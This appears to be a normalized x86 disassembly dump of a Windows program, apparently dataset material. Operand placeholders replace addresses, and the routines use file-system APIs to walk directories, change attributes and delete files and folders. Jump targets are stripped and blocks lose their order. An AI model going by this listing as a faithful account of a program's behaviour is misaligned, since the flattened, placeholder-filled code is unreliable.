mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ edx + ecx + 0x88 ]
lea ecx [ edx + ecx + 0x74 ]
push r--data
mov edi 0xa
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov eax [ ebp - 0x84 ]
lea edx [ ebx * 8 ]
sub edx ebx
cmp [ eax + edx * 4 + 0x18 ] 0x10
lea eax [ eax + edx * 4 ]
jb r-xdata
call sub_4407b7
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
cmp [ esi + 0x68 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x54 ]
lea edi [ ecx + edx + 0xc0 ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x80 ]
mov ebx [ ebp - 0x84 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x20 ] eax
jb r-xdata
mov ebx [ ebp - 0x20 ]
inc ebx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
push eax
call sub_440cb9
add esp 0x4
mov ebx eax
push ebx
mov ecx esi
call sub_406180
test al al
jne r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ ecx + edx + 0x88 ]
lea ecx [ ecx + edx + 0x74 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov eax [ ebp - 0x20 ]
lea edi [ eax * 8 ]
sub edi eax
add edi edi
add edi edi
cmp [ edi + ebx + 0x18 ] 0x10
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x84 ]
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x20 ] ebx
cmp ebx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xc
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov eax [ edx + 0x78 ]
push 0x0
push edi
call eax
test eax eax
jge r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
xor edi edi
add ecx edx
je r-xdata
cmp [ esi + 0x68 ] eax
je r-xdata
lea ebx [ edi + ebx + 0x4 ]
mov ebx [ edi + ebx + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
mov edx [ ecx + 0x2c ]
push 0x1
push ebx
push eax
call edx
mov edi [ esi + 0x70 ]
mov eax [ edi ]
mov ecx [ eax + 0xfc ]
push edi
call ecx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov ecx [ esi + 0xb0 ]
sub ecx [ esi + 0xac ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
lea edi [ edx + eax - 0x1 ]
test edi edi
jl r-xdata
mov [ ebp - 0x24 ] edi
jmp r-xdata
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ ebp - 0x80 ]
mov ebx [ ebp - 0x84 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ esi + 0xbc ] 0x0
je r-xdata
push 0x3b
push ebx
call sub_441150
add esp 0x8
test eax eax
je r-xdata
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov eax [ edx + 0xec ]
push ebx
push edi
call eax
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xb
inc ebx
jmp r-xdata
lea ebx [ edi * 8 ]
sub ebx edi
add ebx ebx
add ebx ebx
nop
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov edx [ ebp - 0x84 ]
lea ecx [ ebx * 8 ]
sub ecx ebx
cmp [ edx + ecx * 4 + 0x18 ] 0x10
lea eax [ edx + ecx * 4 ]
jb r-xdata
call sub_4407b7
cmp [ edi + ebx + 0x18 ] 0x10
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x84 ]
add esi 0xb8
call sub_42ebf0
mov ecx [ ebp - 0x58 ]
mov edx [ ecx + 0x84 ]
push 0x0
push 0x1
push 0x534
push edx
call [ SendMessageW@IAT ]
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0x58 ]
inc ebx
jmp r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
mov edx [ ecx + 0x2c ]
push 0x1
push ebx
push eax
call edx
mov edi [ esi + 0x70 ]
lea ecx [ ebp - 0xc0 ]
push ecx
lea edx [ ebp - 0xe4 ]
push edx
lea ecx [ ebp - 0xdc ]
push ecx
mov [ ebp - 0xc0 ] 0x0
mov eax [ edi ]
mov edx [ eax + 0xbc ]
push ebx
push edi
call edx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov eax [ esi + 0xac ]
add eax ebx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edi [ edi + ebx + 0x4 ]
mov edi [ edi + ebx + 0x4 ]
jmp r-xdata
push r--data
push edi
push eax
call sub_43f7d0
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
mov ecx [ esi + 0x54 ]
lea edx [ ebp - 0xac ]
push edx
push eax
mov eax [ esi + 0x6c ]
push eax
call ecx
add esp 0x10
lea ebx [ ebp - 0xb8 ]
lea edi [ ebp - 0xd8 ]
call sub_40f7b0
mov eax [ esi + 0x6c ]
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx [ esi + 0x54 ]
lea edx [ ebp - 0xa0 ]
push edx
push edi
push eax
call ecx
mov eax [ ebp - 0xa0 ]
mov ecx [ esi + 0x6c ]
push 0x1
lea edx [ ebp - 0xa8 ]
push edx
mov edx [ esi + 0x48 ]
push eax
push ecx
call edx
mov ebx [ ebp - 0x20 ]
add esp 0x20
inc ebx
jmp r-xdata
mov ecx [ esi + 0xb0 ]
sub ecx [ esi + 0xac ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
jb r-xdata
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xb
inc ebx
jmp r-xdata
push eax
call [ RemoveDirectoryW@IAT ]
dec edi
sub ebx 0x1c
test edi edi
jge r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
and ebx 0xfffffffe
cmp edi ecx
jb r-xdata
push eax
call [ GetFileAttributesW@IAT ]
mov ebx eax
test bl 0x1
je r-xdata
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
add [ ebp - 0x24 ] 0x1c
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
inc edi
add ecx edx
cmp edi ecx
jb r-xdata
push ebx
push eax
call [ SetFileAttributesW@IAT ]
sub_405280
push 0xffffffff
push sub_45a868
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x908 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x920 ]
mov [ fs : 0x0 ] eax
xor ebp ebp
push 0x7fe
lea ecx [ esp + 0x122 ]
xor eax eax
push ebp
push ecx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebp
mov [ esp + 0x128 ] ax
call sub_443360
mov ebx 0x7
xor edx edx
add esp 0xc
mov [ esp + 0xe0 ] ebx
mov [ esp + 0xdc ] ebp
mov [ esp + 0xcc ] dx
push 0x400
lea eax [ esp + 0x120 ]
push eax
mov [ esp + 0x930 ] ebp
mov edi [ GetEnvironmentVariableW@IAT ]
push r--data
call edi
cmp eax ebp
jne r-xdata
cmp eax 0x400
jne r-xdata
or esi 0xffffffff
cmp [ esp + 0xe0 ] 0x8
jb r-xdata
lea eax [ esp + 0x11c ]
lea edx [ eax + 0x2 ]
mov edi edi
push rw-data
push 0xfffe
call sub_440cc4
mov esi eax
add esp 0x8
mov [ esp + 0x1c ] esi
cmp esi ebp
jne r-xdata
mov eax esi
mov ecx [ esp + 0xcc ]
push ecx
call sub_43f960
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx bp
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x120 ]
push 0xfffe
push ebp
push esi
call sub_443360
add esp 0xc
push 0x7fff
push esi
push r--data
call edi
cmp eax ebp
jne r-xdata
cmp [ esp + 0xe0 ] 0x8
mov [ esp + 0x18 ] 0xfffffffe
jb r-xdata
mov esi 0x8
mov [ esp + 0x18 ] 0xfffffffd
cmp [ esp + 0xfc ] esi
jb r-xdata
cmp [ esp + 0xf8 ] ebp
je r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
cmp [ esp + 0xe0 ] 0x8
mov [ esp + 0x18 ] 0xffffffff
jmp r-xdata
xor eax eax
mov [ esp + 0xcc ] ax
jmp r-xdata
mov edx [ esp + 0xcc ]
push edx
call sub_43f960
add esp 0x4
xor eax eax
cmp [ esp + 0xe0 ] esi
mov [ esp + 0xfc ] ebx
mov [ esp + 0xf8 ] ebp
mov [ esp + 0xe8 ] ax
mov edx [ esp + 0xe8 ]
push edx
call sub_43f960
add esp 0x4
lea ecx [ esp + 0xc8 ]
push ecx
mov ebx r--data
lea esi [ esp + 0xb0 ]
call sub_428d60
lea edx [ esp + 0xe8 ]
push edx
push eax
lea edi [ esp + 0x80 ]
mov [ esp + 0x934 ] 0x2
call sub_428890
push eax
mov ebx r--data
lea esi [ esp + 0xa0 ]
mov [ esp + 0x938 ] 0x3
call sub_428d60
push eax
mov ebx r--data
lea esi [ esp + 0x50 ]
mov [ esp + 0x93c ] 0x4
call sub_428d60
lea ecx [ esp + 0xf8 ]
push ecx
push eax
lea edi [ esp + 0x74 ]
mov [ esp + 0x944 ] 0x5
call sub_428890
push eax
mov ebx r--data
lea esi [ esp + 0x40 ]
mov [ esp + 0x948 ] 0x6
call sub_428d60
add esp 0x20
mov ebx 0x7
mov [ esp + 0x928 ] bl
push 0xffffffff
xor edx edx
push ebp
lea ecx [ esp + 0x108 ]
mov [ esp + 0x120 ] ebx
mov [ esp + 0x11c ] ebp
mov [ esp + 0x10c ] dx
call sub_429a10
mov esi 0x8
cmp [ esp + 0x38 ] esi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bp
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
jmp r-xdata
jb r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0xe0 ] ebx
mov [ esp + 0xdc ] ebp
cmp eax ebp
je r-xdata
xor edx edx
mov [ esp + 0xcc ] dx
mov ecx [ esp + 0xcc ]
push ecx
call sub_43f960
add esp 0x4
xor ecx ecx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] cx
cmp [ esp + 0x70 ] esi
jb r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_43f960
add esp 0x4
lea esi [ esp + 0xcc ]
call sub_429cc0
xor eax eax
mov [ esp + 0xe8 ] ax
push ebp
mov eax r--data
lea esi [ esp + 0xe8 ]
mov [ esp + 0x100 ] ebx
mov [ esp + 0xfc ] ebp
call sub_429cc0
mov ecx esi
mov [ esp + 0x928 ] 0x1
call sub_429250
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
jmp r-xdata
push eax
call sub_43f97a
add esp 0x4
xor eax eax
mov [ esp + 0x70 ] ebx
mov [ esp + 0x6c ] ebp
mov [ esp + 0x5c ] ax
cmp [ esp + 0x54 ] esi
jb r-xdata
mov edx [ esp + 0x5c ]
push edx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x920 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x908 ]
xor ecx esp
call sub_43f96b
add esp 0x918
retn
xor edx edx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x50 ] ebp
mov [ esp + 0x40 ] dx
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov ecx [ esp + 0x40 ]
push ecx
call sub_43f960
add esp 0x4
xor ecx ecx
mov [ esp + 0xa8 ] ebx
mov [ esp + 0xa4 ] ebp
mov [ esp + 0x94 ] cx
cmp [ esp + 0x8c ] esi
jb r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0x8c ] ebx
mov [ esp + 0x88 ] ebp
mov [ esp + 0x78 ] ax
cmp [ esp + 0xc4 ] esi
jb r-xdata
mov edx [ esp + 0x78 ]
push edx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x104 ]
cmp [ esp + 0x118 ] esi
jae r-xdata
mov ecx [ esp + 0xb0 ]
push ecx
call sub_43f960
add esp 0x4
push eax
push r--data
call [ SetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x104 ]
cmp [ esp + 0x118 ] esi
jb r-xdata
mov [ esp + 0x18 ] 0xfffffffc
xor eax eax
mov [ esp + 0x104 ] ax
mov [ esp + 0x114 ] ebp
mov [ esp + 0x118 ] ebx
cmp [ esp + 0xfc ] esi
jb r-xdata
mov edx [ esp + 0x104 ]
push edx
call sub_43f960
add esp 0x4
xor edx edx
mov [ esp + 0xfc ] ebx
mov [ esp + 0xf8 ] ebp
mov [ esp + 0xe8 ] dx
cmp [ esp + 0xe0 ] esi
jb r-xdata
mov ecx [ esp + 0xe8 ]
push ecx
call sub_43f960
add esp 0x4
xor ecx ecx
mov [ esp + 0xcc ] cx
jmp r-xdata
mov eax [ esp + 0xcc ]
push eax
call sub_43f960
add esp 0x4
sub_405780
push ecx
mov eax [ esp + 0x8 ]
push ebp
push esi
mov esi [ eax + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
push edi
shr ecx 0x1f
xor ebp ebp
xor edi edi
add ecx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
push ebx
xor ebx ebx
jmp r-xdata
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esp + 0x18 ]
mov [ ebx + ecx + 0x90 ] ebp
mov esi [ edx + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
call sub_4407b7
mov esi [ esi + 0xc ]
mov [ esi + ebx + 0x98 ] ebp
mov [ esi + ebx + 0x9c ] ebp
mov [ esp + 0x10 ] 0x0
lea ecx [ ecx ]
call sub_4407b7
mov ecx [ esi + 0xc ]
lea eax [ ecx + ebx + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
mov ecx [ esp + 0x18 ]
mov esi [ ecx + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ebp eax
mov eax 0x4bda12f7
jae r-xdata
call sub_4407b7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc edi
add eax edx
add ebx 0xd8
cmp edi eax
jb r-xdata
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
xor ebp ebp
pop ebx
mov ecx [ esi + 0xc ]
lea esi [ ecx + ebx + 0xc0 ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ebp eax
jb r-xdata
call sub_4407b7
mov ecx [ esi + 0xc ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov [ edx + ecx + 0x90 ] 0x0
mov esi [ eax + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
jb r-xdata
call sub_4407b7
mov edx [ esi + 0xc ]
mov ecx [ edx + ebx + 0xd0 ]
sub ecx [ edx + ebx + 0xcc ]
lea esi [ edx + ebx + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ebp eax
jb r-xdata
call sub_4407b7
mov eax [ esp + 0x10 ]
mov esi [ esi + 0xc ]
xor ecx ecx
mov [ eax + esi + 0x98 ] ecx
mov [ eax + esi + 0x9c ] ecx
inc ebp
add eax 0xc0
mov [ esp + 0x10 ] eax
jmp r-xdata
call sub_4407b7
mov ecx [ esp + 0x18 ]
mov esi [ ecx + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
sub_405980
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45b096
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2b0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2a8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ esp + 0x1c ] eax
mov al [ ecx + 0x7c ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] edx
test al al
jne r-xdata
mov eax 0x1
jmp r-xdata
push rw-data
push 0x1fffe
call sub_440cc4
push rw-data
push 0x1fffe
mov [ esp + 0x20 ] eax
call sub_440cc4
mov edi eax
mov eax [ esp + 0x20 ]
xor ebx ebx
add esp 0x10
mov [ esp + 0x24 ] edi
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x2c0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x2a8 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
xor eax eax
push edi
push eax
jmp r-xdata
push 0x1fffe
push ebx
push eax
call sub_443360
add esp 0xc
push 0x1fffe
push ebx
push edi
call sub_443360
add esp 0xc
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_43f97a
add esp 0x4
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
movzx eax [ ecx ]
mov [ edx ] ax
add ecx 0x2
add edx 0x2
cmp ax bx
jne r-xdata
push edi
call [ PathAddBackslashW@IAT ]
mov eax edi
add eax 0xfffffffe
mov edx edi
mov cx [ eax + 0x2 ]
add eax 0x2
cmp cx bx
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
lea eax [ esp + 0x64 ]
push eax
push edi
call [ FindFirstFileW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x14 ]
mov al [ edx + 0x7c ]
test al al
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_43f97a
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call [ FindClose@IAT ]
mov edx [ esp + 0x10 ]
push edx
call sub_43f97a
add esp 0x4
push edi
call sub_43f97a
add esp 0x4
xor ecx ecx
lea eax [ esp + 0x90 ]
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] cx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x94 ]
lea esi [ esp + 0x30 ]
call sub_429cc0
mov eax esi
mov [ esp + 0x2c8 ] ebx
call sub_428770
mov ecx r--data
lea eax [ esp + 0x90 ]
lea ebx [ ebx ]
sbb eax eax
sbb eax 0xffffffff
cmp dx bx
je r-xdata
mov [ esp + 0x2c8 ] 0xffffffff
cmp [ esp + 0x44 ] 0x8
jb r-xdata
mov ecx r--data
lea eax [ esp + 0x90 ]
nop
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x64 ]
push edx
push eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_43f960
add esp 0x4
sbb eax eax
sbb eax 0xffffffff
cmp dx bx
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
test [ esp + 0x64 ] 0x400
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov edi [ esp + 0x10 ]
push 0x208
push ebx
push edi
call sub_443360
mov eax [ esp + 0x34 ]
add esp 0xc
call sub_428aa0
mov edx edi
lea esi [ esp + 0x2c ]
mov [ esp + 0x2c8 ] 0xffffffff
call sub_429950
jmp r-xdata
cmp eax ebx
je r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
movzx ecx [ eax ]
mov [ edx ] cx
add eax 0x2
add edx 0x2
cmp cx bx
jne r-xdata
push edi
call [ PathAddBackslashW@IAT ]
cmp [ esp + 0x44 ] 0x8
mov eax [ esp + 0x30 ]
jae r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov edx eax
lea ecx [ ecx ]
lea eax [ esp + 0x30 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
add edi 0xfffffffe
mov cx [ edi + 0x2 ]
add edi 0x2
cmp cx bx
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x48 ]
call sub_428a60
lea eax [ esp + 0x48 ]
mov [ esp + 0x2c8 ] 0x1
call sub_428770
test [ esp + 0x64 ] 0x10
je r-xdata
mov eax [ esp + 0x80 ]
mov ebx [ esp + 0x84 ]
xor edi edi
mov esi ebx
test eax eax
je r-xdata
mov ebx [ esp + 0x14 ]
lea edx [ esp + 0x48 ]
push edx
add ebx 0xa0
call sub_428670
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x50 ]
push edx
call sub_405980
jmp r-xdata
lea ecx [ esp + 0x48 ]
call sub_405da0
test al al
je r-xdata
push 0x1
push edi
push edi
push eax
call sub_44de40
mov esi eax
mov edi edx
add esi ebx
mov eax 0x0
adc edi eax
lea esi [ esp + 0x48 ]
call sub_429950
lea esi [ esp + 0x2c ]
mov [ esp + 0x2c8 ] 0xffffffff
call sub_429950
mov edi [ esp + 0x24 ]
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0x20 ]
add [ eax ] esi
mov ebx [ esp + 0x14 ]
adc [ eax + 0x4 ] edi
mov eax [ esp + 0x1c ]
inc [ eax ]
lea eax [ esp + 0x48 ]
push eax
add ebx 0x88
call sub_428670
sub_405da0
sub esp 0x68
xor eax eax
push ebx
xor ebx ebx
cmp [ ecx + 0x18 ] 0x8
push esi
push edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
lea edx [ esp + 0x10 ]
mov [ esp + 0x3e ] eax
mov [ esp + 0x42 ] eax
mov [ esp + 0x46 ] eax
mov [ esp + 0x4a ] ax
push edx
lea eax [ esp + 0x54 ]
xor ecx ecx
push eax
mov [ esp + 0x44 ] cx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
xor al al
pop edi
pop esi
pop ebx
add esp 0x68
retn
lea eax [ esp + 0x4c ]
push eax
push ebx
push ecx
call [ GetFileAttributesExW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov al bl
pop ebx
add esp 0x68
retn
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call [ FileTimeToSystemTime@IAT ]
push ebx
call sub_440ccf
add esp 0x4
push edx
push eax
lea eax [ esp + 0x38 ]
call sub_427ec0
fldz
lea edi [ esp + 0x18 ]
fstp [ esp + 0x18 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x20 ] ebx
call sub_427e20
neg eax
sbb eax eax
inc eax
mov [ esp + 0x20 ] eax
mov eax edi
push eax
lea esi [ esp + 0x28 ]
lea eax [ esp + 0x34 ]
call sub_427cf0
fldz
fld [ esp + 0x24 ]
fcom st1
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
fld [ r--data ]
jmp r-xdata
mov bl 0x1
lea ecx [ esp + 0x24 ]
call sub_427cb0
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
faddp st1
fmul [ r--data ]
call sub_4567d6
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
fild [ esp + 0x10 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
sub_405ef0
push 0xffffffff
push sub_45a148
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x24 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0xc ] ax
push 0xc
mov eax r--data
lea esi [ esp + 0xc ]
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
call sub_429cc0
mov edx edi
mov ecx esi
mov [ esp + 0x2c ] 0x0
call sub_406050
mov [ esp + 0x2c ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
xor edx edx
push 0x6
mov eax r--data
mov ecx edi
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] dx
call sub_429170
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x28
retn
mov ecx [ esp + 0xc ]
push ecx
call sub_43f960
add esp 0x4
sub_405fa0
push 0xffffffff
push sub_45a148
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x24 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0xc ] ax
push 0x9
mov eax r--data
lea esi [ esp + 0xc ]
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
call sub_429cc0
mov edx edi
mov ecx esi
